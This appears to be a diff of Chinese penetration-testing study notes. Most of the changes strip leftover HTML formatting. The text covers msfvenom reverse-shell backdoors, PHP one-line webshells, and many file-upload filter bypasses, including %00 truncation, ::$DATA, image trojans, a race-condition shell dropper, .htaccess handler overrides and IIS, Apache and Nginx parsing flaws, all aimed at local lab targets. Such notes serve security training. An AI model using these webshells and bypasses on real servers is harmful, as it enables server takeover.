@@ -1784,9 +1784,9 @@ shellid		#查看当前执行权限ip addr
 
 
 5. msfvenom 生成后门木马5.1 Msfvenom 是什么？Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。
-5.2 使用场景Msfvenom常用于**红队渗透测试**和**社会工程学攻击**中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动
+5.2 使用场景Msfvenom常用于红队渗透测试和社会工程学攻击中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动
 5.3 核心参数
--p 指定使用的攻击 payload（后门类型），例如&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;windows/meterpreter/reverse_tcp
+-p 指定使用的攻击 payload（后门类型），例如windows/meterpreter/reverse_tcp
 LHOSTLocal Host，攻击机（Kali）IP，受害机主动反弹连接这个地址
 LPORT 攻击机开启监听的端口
 -f 文件输出格式（elf、exe、so、raw 等）
@@ -3694,33 +3694,33 @@ http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
 移动端同类上传功能
 
 3. 基础实操
-普通上传：上传图片至&lt;font style=&quot;color:#181a1f;&quot;&gt;up/目录，访问路径&lt;font style=&quot;color:#181a1f;&quot;&gt;http://127.0.0.1/up/xxx.jpg。
+普通上传：上传图片至up/目录，访问路径http://127.0.0.1/up/xxx.jpg。
 恶意上传1（phpinfo）：
-文件名：&lt;font style=&quot;color:#181a1f;&quot;&gt;1.php
-代码：&lt;font style=&quot;color:#181a1f;&quot;&gt;&lt;?php phpinfo(); ?&gt;
-访问：&lt;font style=&quot;color:#181a1f;&quot;&gt;http://localhost/up/1.php，泄露服务器信息。
+文件名：1.php
+代码：&lt;?php phpinfo(); ?&gt;
+访问：http://localhost/up/1.php，泄露服务器信息。
 
 
 恶意上传2（一句话木马）：
-文件名：&lt;font style=&quot;color:#181a1f;&quot;&gt;2.php
-代码：&lt;font style=&quot;color:#181a1f;&quot;&gt;&lt;?php @eval($_POST[cmd]); ?&gt;
-访问：POST传参&lt;font style=&quot;color:#181a1f;&quot;&gt;cmd=phpinfo();，执行任意代码。
+文件名：2.php
+代码：&lt;?php @eval($_POST[cmd]); ?&gt;
+访问：POST传参cmd=phpinfo();，执行任意代码。
 
 
 
 4. 一句话木马解析
-&lt;font style=&quot;color:#181a1f;&quot;&gt;@：抑制错误，保证代码执行。
-&lt;font style=&quot;color:#181a1f;&quot;&gt;eval()：将字符串当作PHP代码执行。
-&lt;font style=&quot;color:#181a1f;&quot;&gt;$_POST[cmd]：接收POST请求中&lt;font style=&quot;color:#181a1f;&quot;&gt;cmd参数的命令并执行。
+@：抑制错误，保证代码执行。
+eval()：将字符串当作PHP代码执行。
+$_POST[cmd]：接收POST请求中cmd参数的命令并执行。
 
 5. 蚁剑连接一句话木马
-URL：&lt;font style=&quot;color:#181a1f;&quot;&gt;http://localhost/up/2.php
-连接密码：&lt;font style=&quot;color:#181a1f;&quot;&gt;cmd
+URL：http://localhost/up/2.php
+连接密码：cmd
 效果：获取服务器目录权限，可编辑、删除文件，执行系统命令。
 
 
 二、文件上传检测绕过1. JS前端验证绕过
-原理：网站仅在浏览器端使用 JavaScript 检查文件后缀（例如：&lt;font style=&quot;color:#181a1f;&quot;&gt;allowSubmit() 函数限制只能上传 &lt;font style=&quot;color:#181a1f;&quot;&gt;.jpg&#x2F;&lt;font style=&quot;color:#181a1f;&quot;&gt;.png）。
+原理：网站仅在浏览器端使用 JavaScript 检查文件后缀（例如：allowSubmit() 函数限制只能上传 .jpg&#x2F;.png）。
 绕过方法：
 方法一：
 保存网页到本地。
@@ -3737,15 +3737,15 @@ URL：&lt;font style=&quot;color:#181a1f;&quot;&gt;http://localhost/up/2.php
 
 
 2. MIME类型验证绕过
-原理：后端代码通过检查 HTTP 请求头中的 &lt;font style=&quot;color:#181a1f;&quot;&gt;Content-Type 字段来判断文件类型（例如要求必须是 &lt;font style=&quot;color:#181a1f;&quot;&gt;image/jpeg）。
-绕过方法：BurpSuite抓包，修改&lt;font style=&quot;color:#181a1f;&quot;&gt;Content-Type为图片类型。
+原理：后端代码通过检查 HTTP 请求头中的 Content-Type 字段来判断文件类型（例如要求必须是 image/jpeg）。
+绕过方法：BurpSuite抓包，修改Content-Type为图片类型。
 
 3. 黑名单后缀绕过
-原理：后端设置了一个“不允许上传的文件后缀”列表（如禁止 &lt;font style=&quot;color:#181a1f;&quot;&gt;.php, &lt;font style=&quot;color:#181a1f;&quot;&gt;.asp）。如果遇到粗心的管理员，黑名单可能会漏掉一些同样能被解析的替代后缀。
+原理：后端设置了一个“不允许上传的文件后缀”列表（如禁止 .php, .asp）。如果遇到粗心的管理员，黑名单可能会漏掉一些同样能被解析的替代后缀。
 绕过方法：尝试使用黑名单之外但可能被服务器解析的后缀。
-PHP 环境：&lt;font style=&quot;color:#181a1f;&quot;&gt;.php3, &lt;font style=&quot;color:#181a1f;&quot;&gt;.php4, &lt;font style=&quot;color:#181a1f;&quot;&gt;.php5, &lt;font style=&quot;color:#181a1f;&quot;&gt;.phtml, &lt;font style=&quot;color:#181a1f;&quot;&gt;.phtm
-ASP 环境：&lt;font style=&quot;color:#181a1f;&quot;&gt;.asa, &lt;font style=&quot;color:#181a1f;&quot;&gt;.cer, &lt;font style=&quot;color:#181a1f;&quot;&gt;.cdx
-JSP 环境：&lt;font style=&quot;color:#181a1f;&quot;&gt;.jspx, &lt;font style=&quot;color:#181a1f;&quot;&gt;.jsv, &lt;font style=&quot;color:#181a1f;&quot;&gt;.jsw
+PHP 环境：.php3, .php4, .php5, .phtml, .phtm
+ASP 环境：.asa, .cer, .cdx
+JSP 环境：.jspx, .jsv, .jsw
 
 
 
@@ -3755,47 +3755,47 @@ JSP 环境：&lt;font style=&quot;color:#181a1f;&quot;&gt;.jspx, &lt;font style=
 
 &lt;FilesMatch &quot;2.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;
 
-1. &lt;font style=&quot;color:#181a1f;&quot;&gt;上传`&lt;font style=&quot;color:#181a1f;&quot;&gt;.htaccess`&lt;font style=&quot;color:#181a1f;&quot;&gt;文件，内容：
-2. &lt;font style=&quot;color:#181a1f;&quot;&gt;上传名为`&lt;font style=&quot;color:#181a1f;&quot;&gt;loudong.jpg`&lt;font style=&quot;color:#181a1f;&quot;&gt;的PHP木马，自动解析为PHP。
+1. 上传`.htaccess`文件，内容：
+2. 上传名为`loudong.jpg`的PHP木马，自动解析为PHP。
 
 5. 大小写绕过
-原理：后端在写黑名单校验时，忘记使用类似 &lt;font style=&quot;color:#181a1f;&quot;&gt;strtolower() 的函数将文件名统一转为小写。
-绕过方法：文件名改为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.PHP&#x2F;&lt;font style=&quot;color:#181a1f;&quot;&gt;info.PhP。
+原理：后端在写黑名单校验时，忘记使用类似 strtolower() 的函数将文件名统一转为小写。
+绕过方法：文件名改为info.PHP&#x2F;info.PhP。
 
 6. 末尾空格绕过
-原理：代码在黑名单对比时，没有对文件名进行去空格处理（未调用 &lt;font style=&quot;color:#181a1f;&quot;&gt;trim() 函数）。
-绕过方法：Burp修改文件名为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.php （末尾加空格）。
+原理：代码在黑名单对比时，没有对文件名进行去空格处理（未调用 trim() 函数）。
+绕过方法：Burp修改文件名为info.php （末尾加空格）。
 
 7. 末尾点绕过
-原理：代码在黑名单对比时，没有循环利用 &lt;font style=&quot;color:#181a1f;&quot;&gt;deldot() 去除文件名末尾的点。
-绕过方法：Burp修改文件名为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.php.。
+原理：代码在黑名单对比时，没有循环利用 deldot() 去除文件名末尾的点。
+绕过方法：Burp修改文件名为info.php.。
 
 8. Windows ::$DATA绕过
-原理：在 Windows 的 NTFS 文件系统中，包含一种称为NTFS 交换数据流（ADS）的特性。任何文件在后面加上 &lt;font style=&quot;color:#181a1f;&quot;&gt;::$DATA 都会被当做文件流处理，而不会改变文件本身的属性。
-绕过方法：抓包修改文件名为 &lt;font style=&quot;color:#181a1f;&quot;&gt;webshell.php::$DATA。后端的黑名单通常无法匹配这种后缀而放行，但 Windows 在写入磁盘时，会把 &lt;font style=&quot;color:#181a1f;&quot;&gt;::$DATA 之后的内容去掉，最终安全落地为 &lt;font style=&quot;color:#181a1f;&quot;&gt;webshell.php。
+原理：在 Windows 的 NTFS 文件系统中，包含一种称为NTFS 交换数据流（ADS）的特性。任何文件在后面加上 ::$DATA 都会被当做文件流处理，而不会改变文件本身的属性。
+绕过方法：抓包修改文件名为 webshell.php::$DATA。后端的黑名单通常无法匹配这种后缀而放行，但 Windows 在写入磁盘时，会把 ::$DATA 之后的内容去掉，最终安全落地为 webshell.php。
 
 9. 点+空格绕过
-原理：这是由于后端代码逻辑漏洞导致的复合绕过。例如代码只利用 &lt;font style=&quot;color:#181a1f;&quot;&gt;deldot() 或 &lt;font style=&quot;color:#181a1f;&quot;&gt;trim() 处理了一次，由于顺序问题，没有清理干净。&lt;font style=&quot;color:#181a1f;&quot;&gt;deldot函数仅从末尾删点，遇空格停止。
-绕过方法：文件名改为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.php. .（点+空格+点）。
+原理：这是由于后端代码逻辑漏洞导致的复合绕过。例如代码只利用 deldot() 或 trim() 处理了一次，由于顺序问题，没有清理干净。deldot函数仅从末尾删点，遇空格停止。
+绕过方法：文件名改为info.php. .（点+空格+点）。
 
 10. 双写后缀绕过
-原理：后端采用了“黑名单替换”的防御策略，即发现敏感后缀（如 &lt;font style=&quot;color:#181a1f;&quot;&gt;php）就直接将其替换为空字符串（&lt;font style=&quot;color:#181a1f;&quot;&gt;str_replace(&#39;php&#39;, &#39;&#39;, $filename)），但由于只替换了一次，引发了漏洞。
-绕过方法：文件名改为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.pphphp（替换后变为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.php）。
+原理：后端采用了“黑名单替换”的防御策略，即发现敏感后缀（如 php）就直接将其替换为空字符串（str_replace(&#39;php&#39;, &#39;&#39;, $filename)），但由于只替换了一次，引发了漏洞。
+绕过方法：文件名改为info.pphphp（替换后变为info.php）。
 
 11. 0x00 截断绕过
-原理：在底层 C&#x2F;C++ 语言中，&lt;font style=&quot;color:#181a1f;&quot;&gt;0x00（十六进制的 &lt;font style=&quot;color:#181a1f;&quot;&gt;00，即 URL 编码的 &lt;font style=&quot;color:#181a1f;&quot;&gt;%00）被视为字符串的结束标识符。当 PHP 版本 &lt;font style=&quot;color:#181a1f;&quot;&gt;&lt; 5.3.4 且 &lt;font style=&quot;color:#181a1f;&quot;&gt;magic_quotes_gpc = Off 时，如果在拼接文件保存路径时注入了 &lt;font style=&quot;color:#181a1f;&quot;&gt;0x00，底层函数在读取到 &lt;font style=&quot;color:#181a1f;&quot;&gt;0x00 时会认为路径已结束，从而截断后面的合法后缀。
+原理：在底层 C&#x2F;C++ 语言中，0x00（十六进制的 00，即 URL 编码的 %00）被视为字符串的结束标识符。当 PHP 版本 &lt; 5.3.4 且 magic_quotes_gpc = Off 时，如果在拼接文件保存路径时注入了 0x00，底层函数在读取到 0x00 时会认为路径已结束，从而截断后面的合法后缀。
 绕过方法：
-GET 传参：如果上传路径拼接在 URL 中，直接在路径后加上 &lt;font style=&quot;color:#181a1f;&quot;&gt;%00。例如 &lt;font style=&quot;color:#181a1f;&quot;&gt;save_path=../upload/shell.php%00。
-POST 传参：如果路径拼接在 HTTP 请求体（Body）中，由于 POST 不会自动 URL 解码，需要在 Burp Suite 中输入一个占位符（如 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.php+），然后在 Hex（十六进制）视图中，将 &lt;font style=&quot;color:#181a1f;&quot;&gt;+ 对应的十六进制值（&lt;font style=&quot;color:#181a1f;&quot;&gt;2b）修改为 &lt;font style=&quot;color:#181a1f;&quot;&gt;00。
+GET 传参：如果上传路径拼接在 URL 中，直接在路径后加上 %00。例如 save_path=../upload/shell.php%00。
+POST 传参：如果路径拼接在 HTTP 请求体（Body）中，由于 POST 不会自动 URL 解码，需要在 Burp Suite 中输入一个占位符（如 shell.php+），然后在 Hex（十六进制）视图中，将 + 对应的十六进制值（2b）修改为 00。
 
 
 
 12. 图片马 + 文件包含绕过
-原理：后端不再只校验后缀，而是深入检查文件内容。例如读取文件头部前几个字节（Magic Bytes）来判断是否为真实图片，或者调用 &lt;font style=&quot;color:#181a1f;&quot;&gt;getimagesize()、&lt;font style=&quot;color:#181a1f;&quot;&gt;exif_imagetype() 函数验证图片合法性。
+原理：后端不再只校验后缀，而是深入检查文件内容。例如读取文件头部前几个字节（Magic Bytes）来判断是否为真实图片，或者调用 getimagesize()、exif_imagetype() 函数验证图片合法性。
 绕过方法：
-制作图片马：在 Windows 命令行下，使用命令 &lt;font style=&quot;color:#181a1f;&quot;&gt;copy 原图.png /b + 木马.php /a 生成图.png，将恶意代码隐藏在合法图片数据的尾部。
+制作图片马：在 Windows 命令行下，使用命令 copy 原图.png /b + 木马.php /a 生成图.png，将恶意代码隐藏在合法图片数据的尾部。
 上传成功后，该文件在服务器端依然是一张图片，无法直接解析。
-必须配合文件包含漏洞（如服务器存在 &lt;font style=&quot;color:#181a1f;&quot;&gt;include($_GET[&#39;file&#39;]) 逻辑），将上传的图片路径传入包含函数中，强制服务器按 PHP 语法解析该图片，从而触发木马。
+必须配合文件包含漏洞（如服务器存在 include($_GET[&#39;file&#39;]) 逻辑），将上传的图片路径传入包含函数中，强制服务器按 PHP 语法解析该图片，从而触发木马。
 
 
 
@@ -3810,34 +3810,32 @@ POST 传参：如果路径拼接在 HTTP 请求体（Body）中，由于 POST �
 将 PHP 一句话木马插入到这些不发生变化的区域，重新上传即可。
 
 14. 条件竞争绕过
-原理：后端代码存在逻辑时间差（TOCTOU 漏洞）。服务器的流程是：先将文件移动到上传目录 -&gt; 然后判断是否合法 -&gt; 若不合法则调用 &lt;font style=&quot;color:#181a1f;&quot;&gt;unlink() 删除文件。在“判断并删除”的这段极短时间里，文件是真实存在于服务器上的。
+原理：后端代码存在逻辑时间差（TOCTOU 漏洞）。服务器的流程是：先将文件移动到上传目录 -&gt; 然后判断是否合法 -&gt; 若不合法则调用 unlink() 删除文件。在“判断并删除”的这段极短时间里，文件是真实存在于服务器上的。
 绕过方法：
 
 
-准备一个能生成新文件的木马（例如：&lt;font style=&quot;color:#181a1f;&quot;&gt;&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);?&gt;）。
+准备一个能生成新文件的木马（例如：&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);?&gt;）。
 使用抓包工具（如 Burp Suite 的 Intruder）开启大线程，疯狂且持续地上传该木马。
 同时开启另一个工具，疯狂且持续地请求访问该木马的 URL。
-只要在服务器删除它的瞬间之前，有一次 HTTP 请求成功访问到了该文件，木马就会执行，并在服务器上生成一个新的、永远不会被删除的 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.php。
+只要在服务器删除它的瞬间之前，有一次 HTTP 请求成功访问到了该文件，木马就会执行，并在服务器上生成一个新的、永远不会被删除的 shell.php。
 
 15. 白名单 + 数组绕过
-原理：开发者允许用户以数组形式（如 &lt;font style=&quot;color:#181a1f;&quot;&gt;save_name[]）提交文件名，并在后端根据数组索引来拼接最终的文件名。如果代码逻辑中使用了 &lt;font style=&quot;color:#181a1f;&quot;&gt;count() 函数获取数组长度，但拼接时却写死了索引（如 &lt;font style=&quot;color:#181a1f;&quot;&gt;$save_name[0] . &#39;.&#39; . $save_name[count-1]），就会产生逻辑漏洞。
-绕过方法：抓包修改请求，构造一个不连续的数组：&lt;font style=&quot;color:#181a1f;&quot;&gt;save_name[0]=shell.php，&lt;font style=&quot;color:#181a1f;&quot;&gt;save_name[2]=jpg。此时数组长度 &lt;font style=&quot;color:#181a1f;&quot;&gt;count 为 2。拼接时取 &lt;font style=&quot;color:#181a1f;&quot;&gt;$save_name[0] (shell.php) 和 &lt;font style=&quot;color:#181a1f;&quot;&gt;$save_name[1] (由于跳过了1，为空)，最终保存的文件名变成了 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.php.，利用 Windows 特性去除末尾点，落地为 PHP。
-
-
+原理：开发者允许用户以数组形式（如 save_name[]）提交文件名，并在后端根据数组索引来拼接最终的文件名。如果代码逻辑中使用了 count() 函数获取数组长度，但拼接时却写死了索引（如 $save_name[0] . &#39;.&#39; . $save_name[count-1]），就会产生逻辑漏洞。
+绕过方法：抓包修改请求，构造一个不连续的数组：save_name[0]=shell.php，save_name[2]=jpg。此时数组长度 count 为 2。拼接时取 $save_name[0] (shell.php) 和 $save_name[1] (由于跳过了1，为空)，最终保存的文件名变成了 shell.php.，利用 Windows 特性去除末尾点，落地为 PHP。
 
 
 16. 中间件解析漏洞原理与绕过
 IIS 6.0 解析漏洞：
-目录解析原理：IIS 会将以 &lt;font style=&quot;color:#181a1f;&quot;&gt;.asp 命名的文件夹（如 &lt;font style=&quot;color:#181a1f;&quot;&gt;/test.asp/）下的所有文件都当成 ASP 脚本解析。
-绕过方法：如果可以控制上传目录名，建立 &lt;font style=&quot;color:#181a1f;&quot;&gt;.asp 目录，将图片马传进去即可执行。
-分号解析原理：IIS 在解析文件名时，遇到 &lt;font style=&quot;color:#181a1f;&quot;&gt;; 会将其后面的内容截断。
-绕过方法：上传名为 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.asp;.jpg 的文件，过白名单是 &lt;font style=&quot;color:#181a1f;&quot;&gt;.jpg，但 IIS 会当做 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.asp 解析。
+目录解析原理：IIS 会将以 .asp 命名的文件夹（如 /test.asp/）下的所有文件都当成 ASP 脚本解析。
+绕过方法：如果可以控制上传目录名，建立 .asp 目录，将图片马传进去即可执行。
+分号解析原理：IIS 在解析文件名时，遇到 ; 会将其后面的内容截断。
+绕过方法：上传名为 shell.asp;.jpg 的文件，过白名单是 .jpg，但 IIS 会当做 shell.asp 解析。
 Apache 多后缀解析漏洞：
 原理：Apache 的解析规则是从右向左。遇到不认识的后缀，会继续往左读取，直到遇到认识的为止。
-绕过方法：上传名为 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.php.a.b.c 的文件。Apache 不认识 &lt;font style=&quot;color:#181a1f;&quot;&gt;.c, &lt;font style=&quot;color:#181a1f;&quot;&gt;.b, &lt;font style=&quot;color:#181a1f;&quot;&gt;.a，最终会识别到 &lt;font style=&quot;color:#181a1f;&quot;&gt;.php 并执行。
+绕过方法：上传名为 shell.php.a.b.c 的文件。Apache 不认识 .c, .b, .a，最终会识别到 .php 并执行。
 Nginx 解析漏洞 (CGI-PHP)：
-原理：当 PHP 的 &lt;font style=&quot;color:#181a1f;&quot;&gt;cgi.fix_pathinfo=1 时开启。Nginx 遇到请求 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.jpg/.php 时，找不到该文件，会将路径交给 PHP 处理。PHP 会向上解析，发现 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.jpg 存在，就把它当成 PHP 执行了。
-绕过方法：上传正常的图片马 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.jpg。然后在浏览器中访问 &lt;font style=&quot;color:#181a1f;&quot;&gt;http://xxx/shell.jpg/.php，即可触发执行。
+原理：当 PHP 的 cgi.fix_pathinfo=1 时开启。Nginx 遇到请求 shell.jpg/.php 时，找不到该文件，会将路径交给 PHP 处理。PHP 会向上解析，发现 shell.jpg 存在，就把它当成 PHP 执行了。
+绕过方法：上传正常的图片马 shell.jpg。然后在浏览器中访问 http://xxx/shell.jpg/.php，即可触发执行。
 
 
 三、案例分析练习靶场：https://github.com/c0ny1/upload-labs
@@ -3960,16 +3958,16 @@ trim() 它把 $file_ext 里的那个空格削掉了。 此时 $file_ext 变成�
  代码拿 **.** 去对比黑名单，发现不在里面。绕过校验！
 3、操作方法一：.htaccess配置文件条件：服务器是 apache、
 知识补充：
-在 Apache 环境下，&lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;.htaccess写入内容：
+在 Apache 环境下，.htaccess写入内容：
 AddType application/x-httpd-php .jpg
 
 
-核心原理：&lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;AddType 指令用于在给定的文件扩展名与特定的内容类型（MIME type）之间建立映射。这行内容直接命令 Apache：“从现在开始，只要在这个目录下看到以 &lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;.jpg 结尾的文件，不需要管它的二进制内容，统统把它当做 &lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;application/x-httpd-php（即 PHP 脚本）交给 PHP 引擎去解析执行。”
+核心原理：AddType 指令用于在给定的文件扩展名与特定的内容类型（MIME type）之间建立映射。这行内容直接命令 Apache：“从现在开始，只要在这个目录下看到以 .jpg 结尾的文件，不需要管它的二进制内容，统统把它当做 application/x-httpd-php（即 PHP 脚本）交给 PHP 引擎去解析执行。”
 
 &lt;FilesMatch &quot;webshell.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;
 
 
-核心原理：&lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;&lt;FilesMatch&gt; 使用正则表达式来匹配文件名，而 &lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;SetHandler 用于强制指定匹配文件的处理器。这行内容的意思是：“只有当当前目录下的文件名精确叫做 &lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;webshell.jpg 时，才激活 PHP 处理器去执行它。” 这种方式隐蔽性极高，不会影响该目录下其他正常图片的显示。
+核心原理：&lt;FilesMatch&gt; 使用正则表达式来匹配文件名，而 SetHandler 用于强制指定匹配文件的处理器。这行内容的意思是：“只有当当前目录下的文件名精确叫做 webshell.jpg 时，才激活 PHP 处理器去执行它。” 这种方式隐蔽性极高，不会影响该目录下其他正常图片的显示。
 
 
 先上传配置文件 
